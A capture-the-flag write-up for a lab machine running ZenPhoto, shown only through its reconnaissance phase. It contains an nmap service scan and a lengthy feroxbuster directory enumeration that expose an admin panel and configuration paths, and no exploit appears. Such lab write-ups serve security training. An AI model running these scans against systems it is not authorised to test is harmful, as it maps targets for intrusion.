# CTF Writeup: ZenPhoto

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.153.41 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 23:38 EST
Nmap scan report for 192.168.153.41
Host is up (0.029s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
23/tcp   open  ipp     CUPS 1.4
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.4
|_http-title: 403 Forbidden
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.14 (Ubuntu)
3306/tcp open  mysql   MySQL (unauthorized)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=12/21%OT=22%CT=1%CU=31720%PV=Y%DS=4%DC=T%G=Y%TM=6948CB
OS:91%P=x86_64-pc-linux-gnu)SEQ(SP=C2%GCD=1%ISR=C8%TI=Z%CI=Z%II=I%TS=8)SEQ(
OS:SP=C7%GCD=1%ISR=CB%TI=Z%CI=Z%II=I%TS=8)SEQ(SP=C9%GCD=1%ISR=CF%TI=Z%CI=Z%
OS:II=I%TS=8)SEQ(SP=CA%GCD=1%ISR=D0%TI=Z%CI=Z%II=I%TS=8)SEQ(SP=CB%GCD=1%ISR
OS:=D2%TI=Z%CI=Z%II=I%TS=8)OPS(O1=M578ST11NW6%O2=M578ST11NW6%O3=M578NNT11NW
OS:6%O4=M578ST11NW6%O5=M578ST11NW6%O6=M578ST11)WIN(W1=16A0%W2=16A0%W3=16A0%
OS:W4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M578NNSNW6%CC=Y%Q=)T1
OS:(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(
OS:R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164
OS:%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   27.36 ms 192.168.45.1
2   27.34 ms 192.168.45.254
3   27.43 ms 192.168.251.1
4   27.60 ms 192.168.153.41

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.93 seconds
```

Decided to start enumerating the webpage running port 80. The initial webpage doesn't provide any information besides an tag "Under Construction".

I decided to enumerate potential hidden endpoints.

```
feroxbuster -u http://192.168.153.41       
                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.153.41/
 🚩  In-Scope Url          │ 192.168.153.41
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        4l        5w       75c http://192.168.153.41/index
301      GET        9l       28w      315c http://192.168.153.41/test => http://192.168.153.41/test/
200      GET        4l        5w       75c http://192.168.153.41/
404      GET        9l       33w      290c http://192.168.153.41/Reports%20List
404      GET        9l       33w      292c http://192.168.153.41/external%20files
301      GET        9l       28w      323c http://192.168.153.41/test/plugins => http://192.168.153.41/test/plugins/
301      GET        9l       28w      321c http://192.168.153.41/test/cache => http://192.168.153.41/test/cache/
404      GET        9l       33w      291c http://192.168.153.41/Style%20Library
301      GET        9l       28w      322c http://192.168.153.41/test/themes => http://192.168.153.41/test/themes/
301      GET        9l       28w      324c http://192.168.153.41/test/uploaded => http://192.168.153.41/test/uploaded/
200      GET        8l       16w      190c http://192.168.153.41/test/robots
404      GET        9l       33w      295c http://192.168.153.41/test/Reports%20List
200      GET      101l      416w     5015c http://192.168.153.41/test/index
301      GET        9l       28w      322c http://192.168.153.41/test/albums => http://192.168.153.41/test/albums/
200      GET        0l        0w        0c http://192.168.153.41/test/themes/default/register
200      GET        0l        0w        0c http://192.168.153.41/test/themes/default/password
200      GET        0l        0w        0c http://192.168.153.41/test/themes/default/contact
200      GET        0l        0w        0c http://192.168.153.41/test/themes/default/search
301      GET        9l       28w      337c http://192.168.153.41/test/themes/default/styles => http://192.168.153.41/test/themes/default/styles/
200      GET        0l        0w        0c http://192.168.153.41/test/themes/default/archive
200      GET        0l        0w        0c http://192.168.153.41/test/themes/default/404
200      GET        0l        0w        0c http://192.168.153.41/test/themes/default/image
404      GET        9l       33w      297c http://192.168.153.41/test/external%20files
200      GET        0l        0w        0c http://192.168.153.41/test/themes/default/index
404      GET        9l       33w      288c http://192.168.153.41/modern%20mom
404      GET        9l       34w      293c http://192.168.153.41/neuf%20giga%20photo
200      GET       42l      181w    14381c http://192.168.153.41/test/themes/default/theme
301      GET        9l       28w      330c http://192.168.153.41/test/themes/default => http://192.168.153.41/test/themes/default/
200      GET        0l        0w        0c http://192.168.153.41/test/themes/default/album
500      GET        4l       12w      181c http://192.168.153.41/test/themes/default/slideshow
301      GET        9l       28w      337c http://192.168.153.41/test/themes/default/images => http://192.168.153.41/test/themes/default/images/
200      GET        0l        0w        0c http://192.168.153.41/test/themes/stopdesign/search
301      GET        9l       28w      333c http://192.168.153.41/test/themes/stopdesign => http://192.168.153.41/test/themes/stopdesign/
200      GET        0l        0w        0c http://192.168.153.41/test/themes/stopdesign/gallery
200      GET        0l        0w        0c http://192.168.153.41/test/themes/effervescence_plus/search
500      GET        0l        0w        0c http://192.168.153.41/test/themes/effervescence_plus/password
200      GET        0l        0w        0c http://192.168.153.41/test/themes/effervescence_plus/register
200      GET        0l        0w        0c http://192.168.153.41/test/themes/effervescence_plus/contact
500      GET        0l        0w        0c http://192.168.153.41/test/themes/effervescence_plus/pages
500      GET        0l        0w        0c http://192.168.153.41/test/themes/effervescence_plus/gallery
200      GET      287l      571w     5173c http://192.168.153.41/test/themes/effervescence_plus/common
500      GET        0l        0w        0c http://192.168.153.41/test/themes/effervescence_plus/archive
200      GET        0l        0w        0c http://192.168.153.41/test/themes/stopdesign/image
301      GET        9l       28w      349c http://192.168.153.41/test/themes/effervescence_plus/scripts => http://192.168.153.41/test/themes/effervescence_plus/scripts/
301      GET        9l       28w      341c http://192.168.153.41/test/themes/effervescence_plus => http://192.168.153.41/test/themes/effervescence_plus/
500      GET        0l        0w        0c http://192.168.153.41/test/themes/effervescence_plus/404
500      GET        0l        0w        0c http://192.168.153.41/test/themes/effervescence_plus/image
200      GET        0l        0w        0c http://192.168.153.41/test/themes/garland/contact
200      GET        0l        0w        0c http://192.168.153.41/test/themes/stopdesign/index
500      GET        0l        0w        0c http://192.168.153.41/test/themes/effervescence_plus/index
200      GET        0l        0w        0c http://192.168.153.41/test/themes/garland/register
200      GET        0l        0w        0c http://192.168.153.41/test/themes/garland/news
200      GET        0l        0w        0c http://192.168.153.41/test/themes/garland/pages
200      GET        0l        0w        0c http://192.168.153.41/test/themes/garland/gallery
200      GET        0l        0w        0c http://192.168.153.41/test/themes/garland/archive
200      GET        0l        0w        0c http://192.168.153.41/test/themes/garland/404
200      GET        0l        0w        0c http://192.168.153.41/test/themes/garland/image
200      GET        1l        2w     1518c http://192.168.153.41/test/favicon
404      GET        9l       33w      310c http://192.168.153.41/test/themes/default/Reports%20List
500      GET        0l        0w        0c http://192.168.153.41/test/themes/effervescence_plus/functions
500      GET        0l        0w        0c http://192.168.153.41/test/themes/garland/index
200      GET        0l        0w        0c http://192.168.153.41/test/themes/garland/main
200      GET        0l        0w        0c http://192.168.153.41/test/themes/zenpage/contact
301      GET        9l       28w      337c http://192.168.153.41/test/themes/zenpage/images => http://192.168.153.41/test/themes/zenpage/images/
301      GET        9l       28w      330c http://192.168.153.41/test/themes/zenpage => http://192.168.153.41/test/themes/zenpage/
200      GET        0l        0w        0c http://192.168.153.41/test/themes/zenpage/news
301      GET        9l       28w      323c http://192.168.153.41/test/zp-data => http://192.168.153.41/test/zp-data/
200      GET        0l        0w        0c http://192.168.153.41/test/zp-data/zp-config.php
200      GET        5l       11w      458c http://192.168.153.41/test/zp-data/t%c3%a9st.jpg
200      GET        0l        0w        0c http://192.168.153.41/test/themes/zenpage/gallery
500      GET        0l        0w        0c http://192.168.153.41/test/themes/garland/functions
200      GET        0l        0w        0c http://192.168.153.41/test/themes/zenpage/pages
200      GET        0l        0w        0c http://192.168.153.41/test/themes/zenpage/archive
200      GET        0l        0w        0c http://192.168.153.41/test/themes/zenpage/404
200      GET     1311l     2475w    20218c http://192.168.153.41/test/themes/zenpage/style
200      GET        0l        0w        0c http://192.168.153.41/test/themes/zenpage/image
200      GET        0l        0w        0c http://192.168.153.41/test/themes/zenpage/index
301      GET        9l       28w      340c http://192.168.153.41/test/themes/stopdesign/images => http://192.168.153.41/test/themes/stopdesign/images/
200      GET       44l      302w    21131c http://192.168.153.41/test/themes/effervescence_plus/theme
500      GET        0l        0w        0c http://192.168.153.41/test/themes/zenpage/functions
200      GET       70l      431w    34131c http://192.168.153.41/test/themes/garland/theme
200      GET        0l        0w        0c http://192.168.153.41/test/themes/effervescence_plus/album
301      GET        9l       28w      337c http://192.168.153.41/test/themes/stopdesign/css => http://192.168.153.41/test/themes/stopdesign/css/
200      GET        0l        0w        0c http://192.168.153.41/test/themes/garland/album
200      GET        0l        0w        0c http://192.168.153.41/test/themes/stopdesign/contact
500      GET        0l        0w        0c http://192.168.153.41/test/themes/effervescence_plus/slideshow
500      GET        1l        5w       33c http://192.168.153.41/test/themes/stopdesign/comment
500      GET        4l       12w      181c http://192.168.153.41/test/themes/garland/slideshow
200      GET        0l        0w        0c http://192.168.153.41/test/themes/stopdesign/register
200      GET        0l        0w        0c http://192.168.153.41/test/themes/stopdesign/password
200      GET        0l        0w        0c http://192.168.153.41/test/themes/stopdesign/album
301      GET        9l       28w      336c http://192.168.153.41/test/themes/stopdesign/js => http://192.168.153.41/test/themes/stopdesign/js/
500      GET        4l       12w      181c http://192.168.153.41/test/themes/stopdesign/slideshow
200      GET       97l      606w    54788c http://192.168.153.41/test/themes/stopdesign/theme
200      GET       61l      360w    33362c http://192.168.153.41/test/themes/zenpage/theme
301      GET        9l       28w      348c http://192.168.153.41/test/themes/effervescence_plus/images => http://192.168.153.41/test/themes/effervescence_plus/images/
200      GET        0l        0w        0c http://192.168.153.41/test/themes/zenpage/album
200      GET        1l       17w      209c http://192.168.153.41/test/themes/zenpage/footer
200      GET      176l      285w     3024c http://192.168.153.41/test/themes/zenpage/slideshow.css
500      GET        4l       16w      237c http://192.168.153.41/test/themes/zenpage/slideshow
200      GET        0l        0w        0c http://192.168.153.41/test/themes/stopdesign/404
404      GET        9l       33w      293c http://192.168.153.41/test/modern%20mom
404      GET        9l       34w      298c http://192.168.153.41/test/neuf%20giga%20photo
500      GET        0l        0w        0c http://192.168.153.41/test/themes/effervescence_plus/news
404      GET        9l       33w      315c http://192.168.153.41/test/themes/stopdesign/external%20files
301      GET        9l       28w      330c http://192.168.153.41/test/themes/garland => http://192.168.153.41/test/themes/garland/
200      GET        0l        0w        0c http://192.168.153.41/test/themes/zenpage/search
200      GET        0l        0w        0c http://192.168.153.41/test/themes/garland/search
200      GET        0l        0w        0c http://192.168.153.41/test/zp-core/password
301      GET        9l       28w      323c http://192.168.153.41/test/zp-core => http://192.168.153.41/test/zp-core/
301      GET        9l       28w      330c http://192.168.153.41/test/zp-core/images => http://192.168.153.41/test/zp-core/images/
301      GET        9l       28w      326c http://192.168.153.41/test/zp-core/js => http://192.168.153.41/test/zp-core/js/
200      GET        0l        0w        0c http://192.168.153.41/test/zp-core/classes
200      GET        9l       13w      457c http://192.168.153.41/test/zp-core/js/Jcrop.gif
200      GET       34l       74w      621c http://192.168.153.41/test/zp-core/js/farbtastic.css
200      GET       10l      109w     6458c http://192.168.153.41/test/zp-core/js/jquery.tabs.js
200      GET       76l      170w     1778c http://192.168.153.41/test/zp-core/js/toggleElements.css
200      GET       13l      175w     4482c http://192.168.153.41/test/zp-core/js/jquery.flashembed.pack.js
200      GET       35l       89w      748c http://192.168.153.41/test/zp-core/js/jquery.Jcrop.css
200      GET        5l       46w     3063c http://192.168.153.41/test/zp-core/js/flash_detect_min.js
200      GET       23l       46w      402c http://192.168.153.41/test/zp-core/js/zenphoto.js
200      GET       85l      314w     2309c http://192.168.153.41/test/zp-core/js/sprintf.js
200      GET      368l     1385w    10937c http://192.168.153.41/test/zp-core/js/jquery.editinplace.js
200      GET      163l      746w     7487c http://192.168.153.41/test/zp-core/js/htmlencoder.js
200      GET      266l      813w     7182c http://192.168.153.41/test/zp-core/js/jquery.tooltip.js
200      GET      325l      820w     9055c http://192.168.153.41/test/zp-core/js/admin.js
200      GET      287l      913w    10888c http://192.168.153.41/test/zp-core/js/tag.js
200      GET      321l      999w    10765c http://192.168.153.41/test/zp-core/js/jquery.ui.nestedSortable.js
200      GET      329l     1246w     9220c http://192.168.153.41/test/zp-core/js/farbtastic.js
200      GET      215l     1083w     7929c http://192.168.153.41/test/zp-core/js/jquery.scrollTo.js
200      GET      210l      744w    15115c http://192.168.153.41/test/zp-core/js/encoder.js
302      GET        0l        0w        0c http://192.168.153.41/test/zp-core/i => http://192.168.153.41/test/zp-core/images/err-imagenotfound.png
500      GET        8l       24w      291c http://192.168.153.41/test/zp-core/404
200      GET     1197l     3257w    25566c http://192.168.153.41/test/zp-core/js/jquery.Jcrop.js
302      GET        0l        0w        0c http://192.168.153.41/test/zp-core/index => admin.php
200      GET        3l        5w      101c http://192.168.153.41/test/zp-core/c
200      GET        4l       14w     1207c http://192.168.153.41/test/zp-core/images/folder_picture.png
200      GET        7l       14w      444c http://192.168.153.41/test/zp-core/images/fail.png
200      GET       15l       82w     6034c http://192.168.153.41/test/zp-core/images/arrow_left_blue_round.png
200      GET       17l       86w     5998c http://192.168.153.41/test/zp-core/images/pictures_dn.png
200      GET       13l       60w     3867c http://192.168.153.41/test/zp-core/images/imageDefault.png
200      GET       17l       85w     6408c http://192.168.153.41/test/zp-core/images/edit-image.png
200      GET       15l       82w     6532c http://192.168.153.41/test/zp-core/images/reset_icon.png
200      GET       17l       88w     6186c http://192.168.153.41/test/zp-core/images/down.png
200      GET       14l       84w     5803c http://192.168.153.41/test/zp-core/images/magnify.png
200      GET        6l       16w      846c http://192.168.153.41/test/zp-core/images/rss.png
200      GET        3l       12w     1111c http://192.168.153.41/test/zp-core/images/action.png
200      GET        4l       15w      874c http://192.168.153.41/test/zp-core/images/quest.png
200      GET       17l       82w     5690c http://192.168.153.41/test/zp-core/images/note_warn.png
200      GET        3l        8w      483c http://192.168.153.41/test/zp-core/images/page_white_copy.png
200      GET       16l     1267w    85260c http://192.168.153.41/test/zp-core/js/jquery.js
200      GET       22l      119w     9284c http://192.168.153.41/test/zp-core/images/err-passwordprotected.png
200      GET        3l       12w      549c http://192.168.153.41/test/zp-core/images/calendar.png
200      GET        3l       13w      957c http://192.168.153.41/test/zp-core/images/sortorder.png
200      GET        4l       14w      931c http://192.168.153.41/test/zp-core/images/shape_handles.png
200      GET        7l       11w     1059c http://192.168.153.41/test/zp-core/images/admin-headlineback.jpg
200      GET        4l       12w      613c http://192.168.153.41/test/zp-core/images/arrow_up.png
200      GET       19l       26w      891c http://192.168.153.41/test/zp-core/images/admin-buttonback.jpg
200      GET        4l       18w      731c http://192.168.153.41/test/zp-core/images/pencil.png
200      GET       18l       82w     5937c http://192.168.153.41/test/zp-core/images/lock_open.png
200      GET        5l       16w     1135c http://192.168.153.41/test/zp-core/images/redo1.png
200      GET        4l       12w     1083c http://192.168.153.41/test/zp-core/images/cache1.png
200      GET        5l       23w     1253c http://192.168.153.41/test/zp-core/images/cache.png
200      GET        5l       14w      808c http://192.168.153.41/test/zp-core/images/envelope.png
200      GET       15l       76w     5964c http://192.168.153.41/test/zp-core/images/togglero.png
200      GET       15l       75w     5927c http://192.168.153.41/test/zp-core/images/toggleroh.png
200      GET        4l       17w      615c http://192.168.153.41/test/zp-core/images/folder.png
200      GET        3l       19w      983c http://192.168.153.41/test/zp-core/images/burst1.png
200      GET        7l       32w      828c http://192.168.153.41/test/zp-core/images/add.png
200      GET       29l      124w    10031c http://192.168.153.41/test/zp-core/images/err-noflashplayer.png
200      GET        7l       17w     1011c http://192.168.153.41/test/zp-core/images/edit-delete.png
200      GET        7l       20w      997c http://192.168.153.41/test/zp-core/images/arrow_out.png
200      GET        6l       27w     1595c http://192.168.153.41/test/zp-core/images/select_files_button.png
200      GET        4l       20w     1203c http://192.168.153.41/test/zp-core/images/stock_copy.png
200      GET       17l      126w    10336c http://192.168.153.41/test/zp-core/images/err-imagenotfound.png
200      GET        5l       21w     1063c http://192.168.153.41/test/zp-core/images/lock.png
200      GET       44l       58w     1132c http://192.168.153.41/test/zp-core/images/admin-navtabback.jpg
200      GET        4l       16w      432c http://192.168.153.41/test/zp-core/images/bar_graph.png
200      GET       10l       18w      877c http://192.168.153.41/test/zp-core/images/movie.jpg
200      GET       10l       41w     1076c http://192.168.153.41/test/zp-core/images/comments-on.png
200      GET        4l       17w      533c http://192.168.153.41/test/zp-core/images/refresh.png
200      GET       17l       40w     1985c http://192.168.153.41/test/zp-core/images/admin-boxback.jpg
200      GET       15l       79w     5913c http://192.168.153.41/test/zp-core/images/togglerch.png
200      GET        5l       11w      279c http://192.168.153.41/test/zp-core/images/drag_handle.png
200      GET       19l       88w     6139c http://192.168.153.41/test/zp-core/images/refresh1.png
200      GET        6l       14w      740c http://192.168.153.41/test/zp-core/images/searchfields_icon.png
200      GET        7l       12w     1078c http://192.168.153.41/test/zp-core/images/redo.png
200      GET        6l       18w     1021c http://192.168.153.41/test/zp-core/images/arrow_in.png
200      GET       23l       77w     7962c http://192.168.153.41/test/zp-core/images/ajax-loader.gif
200      GET       19l      129w    10256c http://192.168.153.41/test/zp-core/images/err-cachewrite.png
200      GET       15l       73w     5312c http://192.168.153.41/test/zp-core/images/Zp.png
200      GET        5l       14w      643c http://192.168.153.41/test/zp-core/images/reset1.png
200      GET        5l       11w      458c http://192.168.153.41/test/zp-core/images/pass.png
200      GET        6l       50w     1657c http://192.168.153.41/test/zp-core/images/view.png
200      GET       17l       85w     6136c http://192.168.153.41/test/zp-core/images/info.png
200      GET       57l      354w    20909c http://192.168.153.41/test/zp-core/images/wheel.png
200      GET       16l       81w     6084c http://192.168.153.41/test/zp-core/images/info_toggle.png
301      GET        9l       28w      337c http://192.168.153.41/test/themes/garland/images => http://192.168.153.41/test/themes/garland/images/
200      GET        0l        0w        0c http://192.168.153.41/test/zp-core/functions
200      GET        0l        0w        0c http://192.168.153.41/test/themes/zenpage/password
404      GET        9l       33w      310c http://192.168.153.41/test/themes/zenpage/Reports%20List
301      GET        9l       28w      333c http://192.168.153.41/test/zp-core/utilities => http://192.168.153.41/test/zp-core/utilities/
200      GET        0l        0w        0c http://192.168.153.41/test/zp-core/utilities/refresh_database.php
200      GET        0l        0w        0c http://192.168.153.41/test/zp-core/utilities/refresh_metadata.php
500      GET        0l        0w        0c http://192.168.153.41/test/zp-core/utilities/check_for_update.php
200      GET       65l      139w     1163c http://192.168.153.41/test/zp-core/utilities/schedule_content.css
200      GET        0l        0w        0c http://192.168.153.41/test/zp-core/utilities/reset_hitcounters.php
200      GET        0l        0w        0c http://192.168.153.41/test/zp-core/utilities/purge_rss_cache.php
200      GET        0l        0w        0c http://192.168.153.41/test/zp-core/utilities/purge_image_cache.php
200      GET     1013l     5678w   489370c http://192.168.153.41/test/zp-core/images/captcha_background.png
404      GET        9l       33w      312c http://192.168.153.41/test/themes/zenpage/external%20files
302      GET        0l        0w        0c http://192.168.153.41/test/zp-core/utilities/database_reference.php => http://192.168.153.41/test/zp-core/admin.php?from=/test/zp-core/utilities/database_reference.php
302      GET        0l        0w        0c http://192.168.153.41/test/zp-core/utilities/wordpress_import.php => http://192.168.153.41/test/zp-core/admin.php?from=/test/zp-core/utilities/wordpress_import.php
302      GET        0l        0w        0c http://192.168.153.41/test/zp-core/utilities/seo_cleanup.php => http://192.168.153.41/test/zp-core/admin.php?from=/test/zp-core/utilities/seo_cleanup.php
302      GET        0l        0w        0c http://192.168.153.41/test/zp-core/utilities/gallery_statistics.php => http://192.168.153.41/test/zp-core/admin.php?from=/test/zp-core/utilities/gallery_statistics.php
302      GET        0l        0w        0c http://192.168.153.41/test/zp-core/utilities/user_mailing_list.php => http://192.168.153.41/test/zp-core/admin.php?from=/test/zp-core/utilities/user_mailing_list.php
302      GET        0l        0w        0c http://192.168.153.41/test/zp-core/utilities/cache_images.php => http://192.168.153.41/test/zp-core/admin.php?from=/test/zp-core/utilities/cache_images.php
302      GET        0l        0w        0c http://192.168.153.41/test/zp-core/utilities/reset_albumthumbs.php => http://192.168.153.41/test/zp-core/admin.php?from=/test/zp-core/utilities/reset_albumthumbs.php
302      GET        0l        0w        0c http://192.168.153.41/test/zp-core/utilities/backup_restore.php => http://192.168.153.41/test/zp-core/admin.php?from=/test/zp-core/utilities/backup_restore.php
302      GET        0l        0w        0c http://192.168.153.41/test/zp-core/utilities/scheduled_content.php => http://192.168.153.41/test/zp-core/admin.php?from=/test/zp-core/utilities/scheduled_content.php
404      GET        9l       33w      292c http://192.168.153.41/Web%20References
500      GET        0l        0w        0c http://192.168.153.41/test/themes/effervescence_plus/sidebar
200      GET      152l      451w     5653c http://192.168.153.41/test/zp-core/js/jquery.toggleElements.js
500      GET        0l        0w        0c http://192.168.153.41/test/themes/garland/sidebar
200      GET       18l       79w     5364c http://192.168.153.41/test/zp-core/images/drag_handle_flag.png
200      GET       29l      101w     1091c http://192.168.153.41/test/zp-core/js/upload.js
500      GET        7l        5w       50c http://192.168.153.41/test/themes/zenpage/sidebar
200      GET       15l       83w     6319c http://192.168.153.41/test/zp-core/images/comments-off.png
200      GET       10l       21w      634c http://192.168.153.41/test/zp-core/images/admin-headerback.jpg
200      GET       16l       91w     6013c http://192.168.153.41/test/zp-core/images/folder_picture_dn.png
200      GET       16l       61w     3622c http://192.168.153.41/test/zp-core/images/mask.png
200      GET        6l       28w     1072c http://192.168.153.41/test/zp-core/images/marker.png
404      GET        9l       33w      288c http://192.168.153.41/My%20Project
404      GET        9l       33w      311c http://192.168.153.41/test/themes/stopdesign/modern%20mom
404      GET        9l       34w      316c http://192.168.153.41/test/themes/stopdesign/neuf%20giga%20photo
301      GET        9l       28w      330c http://192.168.153.41/test/zp-core/locale => http://192.168.153.41/test/zp-core/locale/
200      GET        6l       24w     1259c http://192.168.153.41/test/zp-core/images/icon_inactive.png
404      GET        9l       33w      305c http://192.168.153.41/test/zp-core/external%20files
500      GET        0l        0w        0c http://192.168.153.41/test/zp-core/controller
200      GET       75l      136w     1158c http://192.168.153.41/test/themes/effervescence_plus/slimbox
301      GET        9l       28w      327c http://192.168.153.41/test/zp-core/rss => http://192.168.153.41/test/zp-core/rss/
301      GET        9l       28w      346c http://192.168.153.41/test/themes/stopdesign/contact_form => http://192.168.153.41/test/themes/stopdesign/contact_form/
200      GET       18l       77w     5874c http://192.168.153.41/test/themes/garland/images/bg-content-left.png
200      GET       16l       81w     5640c http://192.168.153.41/test/themes/garland/images/menu-album.png
404      GET        9l       33w      319c http://192.168.153.41/test/themes/effervescence_plus/modern%20mom
200      GET        0l        0w        0c http://192.168.153.41/test/zp-core/version
404      GET        9l       33w      304c http://192.168.153.41/test/zp-core/Style%20Library
404      GET        9l       33w      288c http://192.168.153.41/Contact%20Us
200      GET       74l      204w     3186c http://192.168.153.41/test/zp-core/admin
200      GET        4l        6w      158c http://192.168.153.41/test/themes/garland/images/bg-navigation.png
200      GET        4l       13w      831c http://192.168.153.41/test/themes/garland/images/bg-content.png
301      GET        9l       28w      343c http://192.168.153.41/test/themes/garland/contact_form => http://192.168.153.41/test/themes/garland/contact_form/
200      GET       14l       76w     5286c http://192.168.153.41/test/themes/garland/images/menu-sub.png
200      GET      901l     1840w    15491c http://192.168.153.41/test/themes/garland/zen
200      GET       97l      312w     5091c http://192.168.153.41/test/zp-core/htaccess
404      GET        9l       33w      293c http://192.168.153.41/test/My%20Project
500      GET        0l        0w        0c http://192.168.153.41/test/zp-core/rss/rss
404      GET        9l       33w      301c http://192.168.153.41/test/zp-core/modern%20mom
404      GET        9l       34w      306c http://192.168.153.41/test/zp-core/neuf%20giga%20photo
404      GET        9l       33w      315c http://192.168.153.41/test/themes/stopdesign/Web%20References
404      GET        9l       33w      289c http://192.168.153.41/Donate%20Cash
404      GET        9l       33w      287c http://192.168.153.41/Home%20Page
404      GET        9l       33w      293c http://192.168.153.41/test/Contact%20Us
404      GET        9l       33w      292c http://192.168.153.41/Planned%20Giving
404      GET        9l       33w      292c http://192.168.153.41/Press%20Releases
404      GET        9l       33w      292c http://192.168.153.41/Privacy%20Policy
404      GET        9l       33w      323c http://192.168.153.41/test/themes/effervescence_plus/Web%20References
404      GET        9l       33w      311c http://192.168.153.41/test/themes/stopdesign/My%20Project
404      GET        9l       33w      312c http://192.168.153.41/test/themes/garland/Web%20References
404      GET        9l       33w      312c http://192.168.153.41/test/themes/zenpage/Web%20References
404      GET        9l       33w      307c http://192.168.153.41/test/zp-core/rss/Reports%20List
404      GET        9l       33w      309c http://192.168.153.41/test/zp-core/rss/external%20files
200      GET        0l        0w        0c http://192.168.153.41/test/zp-core/exif/exif.php
404      GET        9l       33w      308c http://192.168.153.41/test/themes/zenpage/My%20Project
404      GET        9l       33w      305c http://192.168.153.41/test/zp-core/Web%20References
404      GET        9l       33w      308c http://192.168.153.41/test/zp-core/rss/Style%20Library
404      GET        9l       33w      292c http://192.168.153.41/test/Home%20Page
404      GET        9l       33w      297c http://192.168.153.41/test/Press%20Releases
404      GET        9l       33w      297c http://192.168.153.41/test/Privacy%20Policy
301      GET        9l       28w      326c http://192.168.153.41/test/cache_html => http://192.168.153.41/test/cache_html/
301      GET        9l       28w      328c http://192.168.153.41/test/zp-core/exif => http://192.168.153.41/test/zp-core/exif/
404      GET        9l       33w      301c http://192.168.153.41/test/zp-core/My%20Project
404      GET        9l       33w      308c http://192.168.153.41/test/themes/zenpage/Contact%20Us
404      GET        9l       33w      286c http://192.168.153.41/About%20Us
404      GET        9l       33w      290c http://192.168.153.41/Bequest%20Gift
200      GET       70l      391w    30754c http://192.168.153.41/test/themes/effervescence_plus/simpleviewer
404      GET        9l       33w      310c http://192.168.153.41/test/themes/stopdesign/Home%20Page
404      GET        9l       33w      287c http://192.168.153.41/Gift%20Form
404      GET        9l       33w      315c http://192.168.153.41/test/themes/stopdesign/Planned%20Giving
404      GET        9l       33w      315c http://192.168.153.41/test/themes/stopdesign/Press%20Releases
404      GET        9l       33w      309c http://192.168.153.41/test/themes/stopdesign/Site%20Map
200      GET      714l     3528w   114346c http://192.168.153.41/test/doc_files/zenpage_quick_reference.pdf
404      GET        9l       33w      288c http://192.168.153.41/New%20Folder
404      GET        9l       33w      305c http://192.168.153.41/test/zp-core/rss/modern%20mom
404      GET        9l       34w      310c http://192.168.153.41/test/zp-core/rss/neuf%20giga%20photo
404      GET        9l       33w      289c http://192.168.153.41/Site%20Assets
301      GET        9l       28w      346c http://192.168.153.41/test/themes/stopdesign/comment_form => http://192.168.153.41/test/themes/stopdesign/comment_form/
200      GET       93l      160w     1754c http://192.168.153.41/test/themes/zenpage/jcarousel
404      GET        9l       34w      289c http://192.168.153.41/What%20is%20New
404      GET        9l       33w      312c http://192.168.153.41/test/themes/default/Press%20Releases
404      GET        9l       33w      306c http://192.168.153.41/test/themes/default/Site%20Map
404      GET        9l       33w      309c http://192.168.153.41/test/themes/garland/Donate%20Cash
404      GET        9l       33w      301c http://192.168.153.41/test/zp-core/Contact%20Us
404      GET        9l       33w      307c http://192.168.153.41/test/themes/garland/Home%20Page
404      GET        9l       33w      312c http://192.168.153.41/test/themes/garland/Press%20Releases
404      GET        9l       33w      318c http://192.168.153.41/test/themes/effervescence_plus/Home%20Page
404      GET        9l       33w      323c http://192.168.153.41/test/themes/effervescence_plus/Planned%20Giving
404      GET        9l       33w      323c http://192.168.153.41/test/themes/effervescence_plus/Press%20Releases
200      GET      280l     2494w    15127c http://192.168.153.41/test/doc_files/License.txt
301      GET        9l       28w      325c http://192.168.153.41/test/doc_files => http://192.168.153.41/test/doc_files/
